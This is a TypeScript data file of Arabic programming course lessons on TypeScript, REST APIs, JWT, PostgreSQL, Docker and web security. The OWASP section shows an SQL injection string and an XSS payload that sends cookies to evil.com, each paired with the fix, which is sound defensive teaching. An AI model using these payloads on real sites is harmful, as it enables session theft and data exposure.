import { StageDef } from './types';

export const stage3: StageDef = {
  id: "stage-3",
  stageNumber: 3,
  title: "الأنظمة والهيكلية",
  units: [
    {
      id: "unit-11",
      stageId: "stage-3",
      unitNumber: 11,
      title: "TypeScript والشبكات وبناء APIs",
      description: "TypeScript المتقدم، بروتوكولات الشبكات، وبناء REST API احترافي مع Node.js.",
      content: [
        { type: "h1", content: "الوحدة 11: TypeScript والشبكات وبناء APIs" },
        { type: "p", content: "في هذه الوحدة ننتقل من كتابة كود يعمل على جهازك إلى بناء خوادم تخدم آلاف المستخدمين عبر الإنترنت. سنتعلم TypeScript الاحترافية، نفهم كيف تعمل الشبكات، ونبني API حقيقياً." },

        { type: "h2", content: "1. TypeScript — ما وراء الأنواع الأساسية" },
        { type: "h3", content: "Generics — الأنواع المرنة" },
        { type: "p", content: "Generics تتيح لك كتابة كود يعمل مع أي نوع مع الحفاظ على أمان الأنواع." },
        { type: "code", language: "typescript", title: "Generics في الممارسة الفعلية", content: `// ❌ بدون Generics: تفقد أمان الأنواع
function first(arr: any[]): any { return arr[0]; }
const name = first(["Ali", "Sara"]);
name.toUpperCase(); // لا يوجد تحقق!

// ✅ مع Generics: TypeScript يفهم النوع الفعلي
function first<T>(arr: T[]): T | undefined {
  return arr[0];
}
const name = first(["Ali", "Sara"]); // string | undefined
const age  = first([25, 30, 35]);   // number | undefined

// Generic مع قيد (Constraint)
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}
const user = { name: "Ahmed", age: 25, email: "a@b.com" };
const email = getProperty(user, "email");  // string ✅
// getProperty(user, "phone");  // Error: "phone" ليست key في User ✅

// Generic Class
class ApiResponse<T> {
  constructor(
    public data: T,
    public status: number,
    public message: string
  ) {}

  isSuccess(): boolean { return this.status >= 200 && this.status < 300; }
}

const usersResp = new ApiResponse<User[]>(users, 200, "OK");
const orderResp = new ApiResponse<Order>(order, 201, "Created");` },

        { type: "h3", content: "Utility Types — أدوات مدمجة في TypeScript" },
        { type: "code", language: "typescript", title: "Utility Types العملية", content: `interface User {
  id: number;
  name: string;
  email: string;
  passwordHash: string;
  role: "admin" | "client";
  createdAt: Date;
}

// Partial: كل الحقول اختيارية (لـ PATCH endpoints)
type UpdateUserDto = Partial<User>;
// { id?: number; name?: string; email?: string; ... }

// Required: كل الحقول إلزامية
type FullUser = Required<User>;

// Pick: اختر حقولاً محددة فقط
type PublicUser = Pick<User, "id" | "name" | "email">;
// { id: number; name: string; email: string; }

// Omit: احذف حقولاً محددة
type SafeUser = Omit<User, "passwordHash">;
// كل شيء بدون passwordHash

// Record: لبناء قواميس محددة النوع
type UserById = Record<number, User>;
const cache: UserById = {
  1: { id: 1, name: "Ali", email: "ali@a.com", passwordHash: "...", role: "client", createdAt: new Date() }
};

// ReturnType: استخراج نوع قيمة إرجاع دالة
async function fetchUser(id: number): Promise<User> { /* ... */ return {} as User; }
type FetchedUser = Awaited<ReturnType<typeof fetchUser>>; // User` },

        { type: "h3", content: "Type Guards — تضييق الأنواع بأمان" },
        { type: "code", language: "typescript", title: "Type Guards وDiscriminated Unions", content: `// Discriminated Union: كل نوع له خاصية مميزة
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "square"; side: number }
  | { kind: "rectangle"; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {           // TypeScript يعرف النوع الدقيق داخل كل case
    case "circle":    return Math.PI * shape.radius ** 2;
    case "square":    return shape.side ** 2;
    case "rectangle": return shape.width * shape.height;
  }
}

// User-defined Type Guard
function isError(response: unknown): response is { error: string } {
  return typeof response === "object" && response !== null && "error" in response;
}

const result = await fetch("/api/users").then(r => r.json());
if (isError(result)) {
  console.error(result.error); // TypeScript يعرف أن result.error موجود
} else {
  // result هنا ليس خطأ
}` },

        { type: "h2", content: "2. كيف تعمل الشبكات — من الجهل إلى الفهم" },
        { type: "ascii", content: `
 ما يحدث عند فتح google.com:

 [1] المتصفح                    [2] DNS Resolver
     كتبت google.com    ──────►      ما IP لـ google.com؟
                         ◄──────      142.250.x.x

 [3] TCP Handshake                [4] TLS Handshake
     Client ──SYN──►  Server         تبادل شهادات
     Client ◄─SYN/ACK─ Server        التشفير متفق عليه
     Client ──ACK──►  Server         الاتصال آمن ✅

 [5] HTTP Request                 [6] HTTP Response
     GET / HTTP/1.1    ──────►       HTTP/1.1 200 OK
     Host: google.com               Content-Type: text/html
                        ◄──────      [محتوى HTML]
` },

        { type: "table", headers: ["الطبقة", "البروتوكول", "الوظيفة", "مثال"], rows: [
          ["التطبيق (Application)", "HTTP, WebSocket, gRPC", "تبادل البيانات بين التطبيقات", "طلبات API"],
          ["النقل (Transport)", "TCP, UDP", "تقطيع وتجميع البيانات", "TCP: موثوق، UDP: سريع للبث"],
          ["الشبكة (Network)", "IP", "توجيه البيانات عبر الشبكات", "عناوين IP"],
          ["الوصول (Access)", "Ethernet, WiFi", "النقل المادي للبيانات", "كابلات، موجات راديو"]
        ]},

        { type: "h2", content: "3. مبادئ تصميم REST API" },
        { type: "p", content: "REST ليس مجرد 'استخدام HTTP'. له مبادئ تجعل الـ API قابلة للتوقع والفهم لأي مطور:" },
        { type: "table", headers: ["المبدأ", "الشرح", "مثال صحيح"], rows: [
          ["Stateless", "كل طلب يحمل كل معلوماته بنفسه. الخادم لا 'يتذكر' العميل", "JWT في كل طلب بدل Session"],
          ["Resource-Based URLs", "الـ URL يمثل مورداً (اسم)، الـ Method تمثل الفعل", "GET /users بدل /getUsers"],
          ["Consistent Naming", "أسماء موحدة، جمع للموارد", "/users, /orders, /products"],
          ["Nested Resources", "علاقات واضحة في الـ URL", "/users/123/orders"],
          ["Status Codes صحيحة", "استخدم الكود الصحيح لكل حالة", "201 للإنشاء، 404 للغياب، 409 للتعارض"]
        ]},

        { type: "code", language: "typescript", title: "REST API احترافي مع Express + Zod", content: `import express, { Request, Response, NextFunction } from 'express';
import { z } from 'zod';

const app = express();
app.use(express.json());

// Schema التحقق من البيانات مع Zod
const CreateUserSchema = z.object({
  name:     z.string().min(2, "الاسم قصير جداً").max(100),
  email:    z.string().email("البريد غير صالح"),
  password: z.string().min(8, "كلمة المرور قصيرة جداً")
             .regex(/[A-Z]/, "تحتاج حرفاً كبيراً")
             .regex(/[0-9]/, "تحتاج رقماً"),
  age:      z.number().min(13).max(120).optional()
});

type CreateUserDto = z.infer<typeof CreateUserSchema>;

// Middleware التحقق العام
function validate<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: "بيانات غير صالحة",
        details: result.error.flatten().fieldErrors
      });
    }
    req.body = result.data;
    next();
  };
}

// مسارات احترافية
const router = express.Router();

// GET /api/v1/users?page=1&limit=20&role=admin
router.get('/', async (req: Request, res: Response) => {
  const { page = '1', limit = '20', role } = req.query;
  const pageNum  = Math.max(1, parseInt(page as string));
  const limitNum = Math.min(100, parseInt(limit as string));

  const users = await userService.findAll({
    page: pageNum, limit: limitNum,
    role: role as string | undefined
  });

  res.json({
    data: users.items,
    meta: { page: pageNum, limit: limitNum, total: users.total }
  });
});

// POST /api/v1/users
router.post('/', validate(CreateUserSchema), async (req: Request, res: Response) => {
  const dto: CreateUserDto = req.body;
  const user = await userService.create(dto);
  res.status(201).json(user);
});

app.use('/api/v1/users', router);` },

        { type: "h2", content: "4. المصادقة بـ JWT — شرح عميق" },
        { type: "ascii", content: `
JWT = Header.Payload.Signature

Header (Base64):         Payload (Base64):          Signature:
{                        {                           HMACSHA256(
  "alg": "HS256",          "sub": "user-id-123",     base64(header) + "." +
  "typ": "JWT"             "role": "admin",           base64(payload),
}                          "iat": 1703000000,         secret
                           "exp": 1703086400         )
                         }

⚠️ Base64 ليس تشفيراً! الـ Payload قابل للقراءة من أي أحد.
✅ الـ Signature يضمن أن الخادم فقط يمكنه التوقيع والتحقق.
` },
        { type: "code", language: "typescript", title: "JWT Authentication كامل", content: `import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

const JWT_SECRET = process.env.JWT_SECRET!;
const JWT_EXPIRES_IN = '24h';

export const authService = {
  async register(email: string, password: string, name: string) {
    // تشفير كلمة المرور قبل التخزين — لا تخزن نصاً عادياً أبداً!
    const passwordHash = await bcrypt.hash(password, 12); // 12 = rounds
    const user = await db.users.create({ email, passwordHash, name });
    return { user, token: this.generateToken(user) };
  },

  async login(email: string, password: string) {
    const user = await db.users.findByEmail(email);
    if (!user) throw new Error('بيانات غير صحيحة'); // لا تحدد أيهما خاطئ!

    const valid = await bcrypt.compare(password, user.passwordHash);
    if (!valid) throw new Error('بيانات غير صحيحة');

    return { user, token: this.generateToken(user) };
  },

  generateToken(user: { id: string; role: string }) {
    return jwt.sign(
      { sub: user.id, role: user.role },
      JWT_SECRET,
      { expiresIn: JWT_EXPIRES_IN, algorithm: 'HS256' }
    );
  },

  verifyToken(token: string): { sub: string; role: string } {
    return jwt.verify(token, JWT_SECRET) as { sub: string; role: string };
  }
};` },

        { type: "callout", calloutType: "warning", title: "أمان JWT — قواعد لا تُكسر", content: [
          { type: "p", content: "✅ خزّن الـ JWT في httpOnly Cookie (ليس localStorage — عرضة لـ XSS)" },
          { type: "p", content: "✅ أضف دائماً exp (انتهاء صلاحية) — 15 دقيقة للـ Access Token، 7 أيام للـ Refresh Token" },
          { type: "p", content: "✅ استخدم HTTPS دائماً — الـ JWT بدونه ينقل عبر الشبكة بوضوح" },
          { type: "p", content: "❌ لا تضع بيانات حساسة في الـ Payload — الجميع يستطيع قراءتها" }
        ]},

        { type: "active-recall", questions: [
          { q: "ما هو Generic في TypeScript ولماذا يفيد؟", a: "Generic يسمح بكتابة كود مرن يعمل مع أنواع متعددة مع الحفاظ على أمان الأنواع (Type Safety). مثال: function first<T>(arr: T[]): T — تعمل مع أي نوع وتُرجع نفس النوع." },
          { q: "ما الفرق بين Stateful و Stateless APIs؟", a: "Stateful: الخادم يحفظ حالة كل مستخدم بين الطلبات (Sessions). Stateless: كل طلب يحمل كل معلوماته (JWT). Stateless أسهل توسعة لأي خادم يستطيع خدمة أي طلب." },
          { q: "لماذا لا نخزن JWT في localStorage؟", a: "localStorage قابل للوصول من JavaScript، مما يجعله عرضة لهجمات XSS. httpOnly Cookie لا يمكن الوصول إليه من JavaScript على الإطلاق." }
        ]}
      ]
    },
    {
      id: "unit-12",
      stageId: "stage-3",
      unitNumber: 12,
      title: "قواعد البيانات العلاقية (PostgreSQL)",
      description: "تصميم قواعد البيانات، التطبيع، الاستعلامات المتقدمة، والـ ORM.",
      content: [
        { type: "h1", content: "الوحدة 12: قواعد البيانات العلاقية (PostgreSQL)" },
        { type: "p", content: "قاعدة البيانات هي قلب أي تطبيق. قرار التصميم الخاطئ اليوم يكلفك أشهراً من الـ Migration لاحقاً. سنتعلم التصميم الصحيح منذ البداية." },

        { type: "h2", content: "1. التطبيع — مبادئ تصميم البيانات" },
        { type: "p", content: "التطبيع (Normalization) هو عملية تنظيم الجداول لتقليل التكرار وضمان الاتساق." },
        { type: "table", headers: ["المرحلة", "الشرط", "المشكلة التي تحلها"], rows: [
          ["1NF (الأولى)", "لا مجموعات في خلية واحدة، لكل صف معرّف فريد", "phones='0501234,0559876' → جدول منفصل"],
          ["2NF (الثانية)", "كل عمود يعتمد على Primary Key كاملاً", "اسم المنتج في جدول order_items يعتمد على product_id وحده"],
          ["3NF (الثالثة)", "لا اعتماد غير مباشر بين الأعمدة غير المفتاحية", "city → zip_code → country: country يجب أن ينتقل لجدول منفصل"]
        ]},
        { type: "code", language: "sql", title: "تصميم متكامل لتطبيق مدونة", content: `-- ════════════════════════════════
-- المستخدمون
-- ════════════════════════════════
CREATE TABLE users (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  username    VARCHAR(50)  NOT NULL UNIQUE,
  email       TEXT         NOT NULL UNIQUE,
  password_hash TEXT       NOT NULL,
  bio         TEXT,
  avatar_url  TEXT,
  created_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);

-- ════════════════════════════════
-- التصنيفات
-- ════════════════════════════════
CREATE TABLE categories (
  id   SERIAL PRIMARY KEY,
  slug VARCHAR(100) NOT NULL UNIQUE,
  name VARCHAR(100) NOT NULL
);

-- ════════════════════════════════
-- المقالات
-- ════════════════════════════════
CREATE TABLE posts (
  id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  author_id    UUID         NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  category_id  INTEGER      REFERENCES categories(id) ON DELETE SET NULL,
  title        TEXT         NOT NULL,
  slug         TEXT         NOT NULL UNIQUE,
  content      TEXT         NOT NULL,
  status       VARCHAR(20)  NOT NULL DEFAULT 'draft'
                            CHECK (status IN ('draft','published','archived')),
  published_at TIMESTAMPTZ,
  created_at   TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
  updated_at   TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);

-- ════════════════════════════════
-- العلاقة N:M — المقالات والوسوم
-- ════════════════════════════════
CREATE TABLE tags (
  id   SERIAL PRIMARY KEY,
  slug VARCHAR(100) NOT NULL UNIQUE,
  name VARCHAR(100) NOT NULL
);

CREATE TABLE post_tags (           -- جدول الوسيط للعلاقة N:M
  post_id UUID    REFERENCES posts(id) ON DELETE CASCADE,
  tag_id  INTEGER REFERENCES tags(id)  ON DELETE CASCADE,
  PRIMARY KEY (post_id, tag_id)
);

-- ════════════════════════════════
-- التعليقات (علاقة ذاتية)
-- ════════════════════════════════
CREATE TABLE comments (
  id        UUID    PRIMARY KEY DEFAULT gen_random_uuid(),
  post_id   UUID    NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
  author_id UUID    NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  parent_id UUID    REFERENCES comments(id) ON DELETE CASCADE, -- تعليق على تعليق
  content   TEXT    NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);` },

        { type: "h2", content: "2. الاستعلامات المتقدمة" },
        { type: "code", language: "sql", title: "JOINs والـ CTEs", content: `-- ════════════════════════════════
-- استعلام معقد: المقالات مع كل بياناتها
-- ════════════════════════════════
SELECT
  p.id,
  p.title,
  p.status,
  p.published_at,
  u.username           AS author_name,
  u.avatar_url         AS author_avatar,
  c.name               AS category,
  COUNT(DISTINCT cm.id)   AS comments_count,
  ARRAY_AGG(DISTINCT t.name) FILTER (WHERE t.name IS NOT NULL) AS tags

FROM posts p
LEFT JOIN users      u  ON p.author_id    = u.id
LEFT JOIN categories c  ON p.category_id  = c.id
LEFT JOIN comments   cm ON cm.post_id     = p.id
LEFT JOIN post_tags  pt ON pt.post_id     = p.id
LEFT JOIN tags       t  ON pt.tag_id      = t.id

WHERE p.status = 'published'
GROUP BY p.id, u.username, u.avatar_url, c.name
ORDER BY p.published_at DESC
LIMIT 20 OFFSET 0;

-- ════════════════════════════════
-- CTE: المقالات الأكثر تعليقاً
-- ════════════════════════════════
WITH comment_counts AS (
  SELECT post_id, COUNT(*) AS total
  FROM comments
  GROUP BY post_id
),
top_posts AS (
  SELECT p.*, cc.total AS comments_total
  FROM posts p
  JOIN comment_counts cc ON p.id = cc.post_id
  WHERE p.status = 'published'
  ORDER BY cc.total DESC
  LIMIT 10
)
SELECT tp.title, tp.comments_total, u.username
FROM top_posts tp
JOIN users u ON tp.author_id = u.id;` },

        { type: "h2", content: "3. الفهارس (Indexes) — مفتاح الأداء" },
        { type: "p", content: "الفهرس كفهرس الكتاب: بدونه تقرأ كل الصفحات للعثور على كلمة. معه تقفز مباشرة للصفحة المطلوبة." },
        { type: "code", language: "sql", title: "إنشاء الفهارس المناسبة", content: `-- فهرس على الحقول المستخدمة في WHERE
CREATE INDEX idx_posts_status          ON posts(status);
CREATE INDEX idx_posts_author_id       ON posts(author_id);
CREATE INDEX idx_posts_published_at    ON posts(published_at DESC);

-- فهرس مركّب: للاستعلامات التي تفلتر بعدة حقول دفعة واحدة
CREATE INDEX idx_posts_status_author   ON posts(status, author_id);

-- فهرس للبحث النصي الكامل (Full-Text Search)
ALTER TABLE posts ADD COLUMN search_vector tsvector
  GENERATED ALWAYS AS (
    to_tsvector('arabic', title || ' ' || content)
  ) STORED;
CREATE INDEX idx_posts_fts ON posts USING GIN(search_vector);

-- استخدام البحث النصي
SELECT title FROM posts
WHERE search_vector @@ plainto_tsquery('arabic', 'قواعد البيانات')
ORDER BY ts_rank(search_vector, plainto_tsquery('arabic', 'قواعد البيانات')) DESC;

-- تحليل أداء الاستعلام
EXPLAIN ANALYZE SELECT * FROM posts WHERE author_id = 'some-uuid';
-- ابحث عن "Index Scan" — إذا رأيت "Seq Scan" ربما تحتاج فهرساً` },

        { type: "h2", content: "4. المعاملات (Transactions) وخصائص ACID" },
        { type: "table", headers: ["الخاصية", "الاسم", "الشرح", "مثال"], rows: [
          ["A", "Atomicity (الذرية)", "كل العمليات تنجح معاً أو تفشل معاً", "تحويل بنكي: خصم + إضافة (أو لا شيء)"],
          ["C", "Consistency (الاتساق)", "قاعدة البيانات دائماً في حالة صحيحة", "Foreign Key: لا تُضاف تعليق لمقال محذوف"],
          ["I", "Isolation (العزل)", "المعاملات المتوازية لا تؤثر على بعضها", "شخصان يحجزان نفس المقعد الأخير"],
          ["D", "Durability (الثبات)", "البيانات المحفوظة تظل حتى بعد انقطاع التيار", "WAL (Write-Ahead Log) في PostgreSQL"]
        ]},
        { type: "code", language: "typescript", title: "Transaction في Node.js مع pg", content: `import { Pool } from 'pg';
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

async function transferMoney(fromId: string, toId: string, amount: number) {
  const client = await pool.connect();

  try {
    await client.query('BEGIN');

    // 1. تحقق من الرصيد
    const { rows: [from] } = await client.query(
      'SELECT balance FROM accounts WHERE id = $1 FOR UPDATE', // FOR UPDATE: يقفل الصف
      [fromId]
    );
    if (from.balance < amount) throw new Error('رصيد غير كافٍ');

    // 2. خصم من الحساب الأول
    await client.query(
      'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
      [amount, fromId]
    );

    // 3. إضافة للحساب الثاني
    await client.query(
      'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
      [amount, toId]
    );

    // 4. تسجيل العملية
    await client.query(
      'INSERT INTO transactions (from_id, to_id, amount) VALUES ($1, $2, $3)',
      [fromId, toId, amount]
    );

    await client.query('COMMIT');  // كل شيء نجح
    return { success: true };

  } catch (error) {
    await client.query('ROLLBACK');  // كل شيء يُلغى
    throw error;
  } finally {
    client.release();  // إرجاع الاتصال للـ Pool
  }
}` },

        { type: "h2", content: "5. ORM — Drizzle ORM مع TypeScript" },
        { type: "p", content: "ORM يسمح بكتابة استعلامات قاعدة البيانات بكود TypeScript بدل SQL الخام، مع أمان الأنواع الكامل." },
        { type: "code", language: "typescript", title: "Drizzle ORM — Schema وAستعلامات", content: `import { pgTable, uuid, text, timestamp, pgEnum } from 'drizzle-orm/pg-core';
import { db } from './database';
import { eq, desc, and, count } from 'drizzle-orm';

// تعريف الجدول — يُولّد أنواع TypeScript تلقائياً
const statusEnum = pgEnum('post_status', ['draft', 'published', 'archived']);

const posts = pgTable('posts', {
  id:          uuid('id').primaryKey().defaultRandom(),
  authorId:    uuid('author_id').notNull(),
  title:       text('title').notNull(),
  status:      statusEnum('status').notNull().default('draft'),
  publishedAt: timestamp('published_at', { withTimezone: true }),
  createdAt:   timestamp('created_at', { withTimezone: true }).notNull().defaultNow()
});

// Drizzle يُنتج type آمناً تلقائياً
type Post = typeof posts.$inferSelect;  // لـ SELECT
type NewPost = typeof posts.$inferInsert; // لـ INSERT

// استعلامات
const publishedPosts = await db
  .select()
  .from(posts)
  .where(eq(posts.status, 'published'))
  .orderBy(desc(posts.publishedAt))
  .limit(20);

// INSERT مع أنواع صحيحة
const newPost: NewPost = { authorId: userId, title: "مقال جديد", status: 'draft' };
const [created] = await db.insert(posts).values(newPost).returning();` },

        { type: "active-recall", questions: [
          { q: "ما هو هدف التطبيع (Normalization) وكيف تعرف أن تصميمك محتاج له؟", a: "التطبيع يُزيل تكرار البيانات ويضمن الاتساق. علامات الحاجة: تجد نفس البيانات في أماكن متعددة، تحديث معلومة يتطلب تعديل صفوف كثيرة، قيم متعددة في خلية واحدة." },
          { q: "لماذا الفهارس مهمة ومتى تكون ضارة؟", a: "مهمة: تسرّع استعلامات القراءة بشكل كبير. ضارة: تُبطئ عمليات INSERT وUPDATE وDELETE (تُحدَّث مع كل تغيير). لا تُضف فهرساً على جدول صغير أو حقل نادر الاستخدام في WHERE." },
          { q: "ما هي ACID وأهميتها في التطبيقات المالية؟", a: "ACID: Atomicity (كل شيء أو لا شيء)، Consistency (لا بيانات فاسدة)، Isolation (عمليات متوازية لا تتداخل)، Durability (البيانات تثبت). في التطبيقات المالية: يمنع حالات مثل خصم المال من حساب دون إضافته لحساب آخر." }
        ]}
      ]
    },
    {
      id: "unit-13",
      stageId: "stage-3",
      unitNumber: 13,
      title: "النشر وDevOps وأمن الويب",
      description: "Docker، CI/CD، أمن التطبيقات، وبيئات الإنتاج الاحترافية.",
      content: [
        { type: "h1", content: "الوحدة 13: النشر وDevOps وأمن الويب" },
        { type: "p", content: "كتابة الكود 50% من العمل. النصف الآخر هو جعله يعمل بشكل موثوق في الإنتاج وحمايته من الاختراقات. هذه الوحدة تحوّلك من 'يكتب كود' إلى 'يبني أنظمة'." },

        { type: "h2", content: "1. بيئات التطوير — من Localhost للإنتاج" },
        { type: "ascii", content: `
 Developer                  CI/CD Pipeline               Production
 Laptop                                                  Cloud Server

[Local Dev] ──push──► [GitHub] ──trigger──► [Test] ──► [Staging] ──► [Production]
 localhost              code                  Lint        Preview       Live Users
                        review                Tests       QA Team
` },
        { type: "table", headers: ["البيئة", "الغرض", "من يصل إليها؟", "قاعدة البيانات"], rows: [
          ["Development (local)", "التطوير اليومي", "المطور فقط", "بيانات وهمية على الجهاز"],
          ["Testing (CI)", "تشغيل الاختبارات التلقائية", "CI Server (GitHub Actions)", "DB مؤقتة تُحذف بعد الاختبار"],
          ["Staging", "اختبار قبل الإنتاج", "فريق الجودة، العميل للمراجعة", "نسخة من بيانات الإنتاج"],
          ["Production", "المنتج الحقيقي", "المستخدمون النهائيون", "البيانات الحقيقية (حساسة!"]
        ]},

        { type: "h2", content: "2. Docker — الحاويات بعمق" },
        { type: "p", content: "Docker يحل مشكلة 'يعمل على جهازي' بتغليف التطبيق وكل اعتماداته في 'حاوية' قابلة للتشغيل في أي مكان." },
        { type: "code", language: "dockerfile", title: "Dockerfile احترافي (Multi-Stage Build)", content: `# ════ المرحلة 1: البناء ════
FROM node:20-alpine AS builder
WORKDIR /app

# نسخ ملفات الاعتماديات أولاً (Docker Caching تحسين)
COPY package*.json tsconfig.json ./
RUN npm ci                         # أسرع وأأمن من npm install

# بناء الكود
COPY src/ ./src/
RUN npm run build                  # src/**.ts → dist/**.js

# ════ المرحلة 2: التشغيل (صورة أصغر وأأمن) ════
FROM node:20-alpine AS runner

# إضافة مستخدم غير root للأمان
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app

# نسخ فقط ما نحتاجه من مرحلة البناء
COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules
COPY --chown=appuser:appgroup package.json ./

USER appuser                        # تشغيل كمستخدم عادي
EXPOSE 3000

# Health Check: يتحقق من صحة الخادم كل 30 ثانية
HEALTHCHECK --interval=30s --timeout=5s --retries=3 \\
  CMD wget -qO- http://localhost:3000/api/health || exit 1

CMD ["node", "dist/index.js"]` },

        { type: "code", language: "yaml", title: "docker-compose.yml — بيئة تطوير متكاملة", content: `version: '3.9'

services:
  api:
    build:
      context: .
      target: builder        # استخدم مرحلة الـ builder للتطوير
    command: npm run dev      # nodemon للـ Hot Reload
    ports: ["3000:3000"]
    environment:
      NODE_ENV: development
      DATABASE_URL: postgresql://user:pass@db:5432/appdb
      JWT_SECRET: dev-only-secret
    volumes:
      - ./src:/app/src        # تحديث مباشر دون إعادة بناء
    depends_on:
      db: { condition: service_healthy }

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: appdb
    ports: ["5432:5432"]
    volumes: [postgres_data:/var/lib/postgresql/data]
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d appdb"]
      interval: 10s

  redis:
    image: redis:7-alpine
    ports: ["6379:6379"]

  # أداة مرئية لإدارة قاعدة البيانات
  adminer:
    image: adminer:latest
    ports: ["8080:8080"]

volumes:
  postgres_data:` },

        { type: "h2", content: "3. أمن الويب — OWASP Top 10" },
        { type: "p", content: "OWASP (Open Web Application Security Project) تنشر سنوياً قائمة أخطر ثغرات الويب. هذه هي أهم ثلاث:" },

        { type: "callout", calloutType: "mistake", title: "1. SQL Injection", content: [
          { type: "p", content: "يحدث عند دمج مدخلات المستخدم في استعلام SQL مباشرة." },
          { type: "code", language: "typescript", content: `// ❌ كارثة: المهاجم يرسل: email = "' OR '1'='1"
const query = \`SELECT * FROM users WHERE email = '\${req.body.email}'\`;
// يُصبح: SELECT * FROM users WHERE email = '' OR '1'='1'
// يُرجع كل المستخدمين!

// ✅ الحل: Parameterized Queries دائماً
await db.query('SELECT * FROM users WHERE email = $1', [req.body.email]);` }
        ]},

        { type: "callout", calloutType: "warning", title: "2. XSS — Cross-Site Scripting", content: [
          { type: "p", content: "يحدث عند عرض محتوى المستخدم دون تنظيف، مما يسمح بتنفيذ كود JavaScript ضار في متصفح مستخدمين آخرين." },
          { type: "code", language: "typescript", content: `// ❌ خطر: المهاجم يرسل: <script>document.location='https://evil.com?c='+document.cookie</script>
// وتعرضه للمستخدمين الآخرين

// ✅ في React: التلقائي — JSX يُهرّب النص تلقائياً
<p>{userComment}</p>  // آمن تلقائياً

// ✅ إذا احتجت HTML خاماً: استخدم DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />

// ✅ في Express: استخدم helmet لإعداد Security Headers
import helmet from 'helmet';
app.use(helmet()); // يُضيف X-Content-Type-Options, X-Frame-Options, CSP, وغيرها` }
        ]},

        { type: "callout", calloutType: "mistake", title: "3. IDOR — Insecure Direct Object Reference", content: [
          { type: "p", content: "يحدث عندما يستطيع المستخدم الوصول لبيانات مستخدم آخر بتغيير ID في الـ URL." },
          { type: "code", language: "typescript", content: `// ❌ خطر: المستخدم يغير /orders/123 إلى /orders/456 ويرى طلب شخص آخر!
app.get('/orders/:id', auth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order); // يُرجع الطلب حتى لو لم يكن للمستخدم الحالي!
});

// ✅ الحل: تحقق دائماً من الملكية
app.get('/orders/:id', auth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (!order)                               return res.status(404).json({ error: 'غير موجود' });
  if (order.userId !== req.user.id && req.user.role !== 'admin')
                                            return res.status(403).json({ error: 'غير مصرح' });
  res.json(order);
});` }
        ]},

        { type: "h2", content: "4. إدارة الأسرار والمتغيرات" },
        { type: "code", language: "typescript", title: "إدارة Config بشكل آمن", content: `// config.ts — تحميل والتحقق من الـ Environment Variables
import { z } from 'zod';

const envSchema = z.object({
  NODE_ENV:     z.enum(['development', 'test', 'production']),
  PORT:         z.coerce.number().default(3000),
  DATABASE_URL: z.string().url('DATABASE_URL يجب أن يكون URL صالحاً'),
  JWT_SECRET:   z.string().min(32, 'JWT_SECRET يجب أن يكون 32 حرفاً على الأقل'),
  REDIS_URL:    z.string().url().optional(),
});

// يتحقق عند إقلاع التطبيق، يفشل فوراً إن كان ناقصاً
const parsed = envSchema.safeParse(process.env);
if (!parsed.success) {
  console.error('❌ متغيرات البيئة غير مكتملة:');
  console.error(parsed.error.flatten().fieldErrors);
  process.exit(1);  // أوقف التطبيق فوراً بدل تشغيله بشكل ناقص
}

export const config = parsed.data;` },

        { type: "h2", content: "5. Rate Limiting — منع الإساءة" },
        { type: "code", language: "typescript", title: "Rate Limiting مع Redis", content: `import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { redis } from './redis';

// 100 طلب كل 15 دقيقة لكل IP
export const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,    // 15 دقيقة
  max: 100,
  standardHeaders: true,        // يُرسل Retry-After header
  store: new RedisStore({ client: redis }), // مشترك بين الخوادم
  message: { error: 'طلبات كثيرة. حاول لاحقاً.' }
});

// 5 محاولات تسجيل دخول فقط كل ساعة
export const loginLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,    // ساعة
  max: 5,
  keyGenerator: (req) => req.body.email,  // على أساس البريد وليس IP
  skipSuccessfulRequests: true,           // لا تحسب المحاولات الناجحة
  message: { error: 'حساب مقفل مؤقتاً لمحاولات تسجيل الدخول المتعددة' }
});

app.use('/api', globalLimiter);
app.post('/api/auth/login', loginLimiter, authController.login);` },

        { type: "active-recall", questions: [
          { q: "ما الفرق بين Dockerfile و docker-compose.yml؟", a: "Dockerfile يصف كيف تبني صورة (Image) لخدمة واحدة. docker-compose.yml يصف كيف تشغّل عدة خدمات معاً وتربطها ببعض (API + DB + Redis)." },
          { q: "ما هو IDOR وكيف تمنعه؟", a: "IDOR: المستخدم يصل لبيانات آخرين بتغيير ID في الطلب. الحل: بعد جلب السجل، تحقق دائماً من أن userId في السجل يطابق req.user.id (أو أن المستخدم admin)." },
